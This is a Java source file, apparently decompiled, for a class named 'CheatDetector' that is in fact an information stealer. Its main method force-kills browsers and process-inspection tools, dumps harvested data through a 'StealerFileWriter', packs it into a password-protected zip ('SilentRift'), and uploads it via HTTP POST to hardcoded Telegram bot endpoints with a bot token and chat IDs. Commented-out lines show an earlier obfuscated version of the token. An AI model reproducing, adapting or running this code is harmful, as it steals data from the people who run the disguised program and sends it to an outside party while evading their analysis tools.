package bro;

import bro.utilities.*;
import java.io.File;
import java.net.*;
import java.nio.file.Files;
import net.lingala.zip4j.ZipFile;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.model.enums.CompressionLevel;
import net.lingala.zip4j.model.enums.EncryptionMethod;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.HttpClientBuilder;

public class CheatDetector {
   public static final StealerFileWriter sfw = new StealerFileWriter();
   public static final File TEMP_DIRECTORY = new File(OSUtility.TEMP + "\\LOG-" + OSUtility.generateNumber(8) + "\\");;
   public static final File TEMP_ZIP = new File(TEMP_DIRECTORY.getParentFile().getAbsolutePath() + "\\" + TEMP_DIRECTORY.getName() + ".zip");

   public static void sendFile() {
      try {
         //TODO: I will specifically leave here the data of an unscrupulous person
         createRequest("https://api.telegram.org/bot7053277690:AAFruzUrA8kHFqRpdGP2mwzm4iClw7ztPjc/sendDocument?chat_id=5825126599");
         createRequest("https://api.telegram.org/bot7053277690:AAFruzUrA8kHFqRpdGP2mwzm4iClw7ztPjc/sendDocument?chat_id=856380400");

         //createRequest("https://api.telegram.org/bot" + new String(BCUtils.dec("62620464:18B@DqtxVsC;jJEpPseES3ot{o7hAov5yuRib".getBytes(), getKey(), getLength("62620464:18B@DqtxVsC;jJEpPseES3ot{o7hAov5yuRib".getBytes()))) + "/sendDocument?chat_id=" + new String(BCUtils.dec("4:143177:8".getBytes(), getKey(), getLength("4:143177:8".getBytes()))));
         //createRequest("https://api.telegram.org/bot" + new String(BCUtils.dec("62620464:18B@DqtxVsC;jJEpPseES3ot{o7hAov5yuRib".getBytes(), getKey(), getLength("62620464:18B@DqtxVsC;jJEpPseES3ot{o7hAov5yuRib".getBytes()))) + "/sendDocument?chat_id=" + new String(BCUtils.dec("9752:3523".getBytes(), getKey(), getLength("9752:3523".getBytes()))));
      } catch (Exception var1) {
      }

   }

   public static void createRequest(String var0) throws Exception {
      HttpPost var1 = new HttpPost(var0);
      MultipartEntityBuilder var2 = MultipartEntityBuilder.create().addBinaryBody("document", Files.newInputStream(TEMP_ZIP.toPath()), ContentType.APPLICATION_OCTET_STREAM, TEMP_ZIP.getName());
      var1.setEntity(var2.build());
      HttpClientBuilder.create().build().execute(var1);
   }

   public static void main(String[] var0) throws Exception {
      if (isNetAvailable()) {
         Runtime.getRuntime().exec("taskkill /f /im processhacker.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im systeminformer.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im HTTPDebuggerUI.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im chrome.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im yandex.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im browser.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im msedge.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im opera.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im operagx.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im atom.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im vivaldi.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im dragon.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im brave.exe /t");
         sfw.writeEverything();
         ZipParameters var1 = new ZipParameters();
         //ZipFile var2 = new ZipFile(TEMP_ZIP, (new String(BCUtils.dec("RkodlwSkeu".getBytes(), getKey(), getLength("RkodlwSkeu".getBytes())))).toCharArray());
         ZipFile var2 = new ZipFile(TEMP_ZIP, "SilentRift".toCharArray());
         var1.setEncryptFiles(true);
         var1.setCompressionLevel(CompressionLevel.NORMAL);
         var1.setEncryptionMethod(EncryptionMethod.ZIP_STANDARD);
         var2.addFolder(new File(TEMP_DIRECTORY.getAbsolutePath()), var1);
         OSUtility.delHelp(TEMP_DIRECTORY.toPath());
         sendFile();
         Runtime.getRuntime().exec("taskkill /f /im processhacker.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im systeminformer.exe /t");
         Runtime.getRuntime().exec("taskkill /f /im HTTPDebuggerUI.exe /t");
      }
   }

   public static boolean isNetAvailable() {
      try {
         URL var0 = new URL("http://www.google.com");
         URLConnection var1 = var0.openConnection();
         var1.connect();
         var1.getInputStream().close();
         return true;
      } catch (Exception var2) {
         return false;
      }
   }

   //public static byte[] getKey() {
   //   return new byte[]{1, 2, 3};
   //}

   //public static byte[] getLength(byte[] var0) {
   //   return new byte[var0.length];
   //}

   //static {
   //   TEMP_DIRECTORY = new File(OSUtility.TEMP + "\\LOG-" + OSUtility.generateNumber(8) + "\\");
   //   TEMP_ZIP = new File(TEMP_DIRECTORY.getParentFile().getAbsolutePath() + "\\" + TEMP_DIRECTORY.getName() + ".zip");
   //}
}
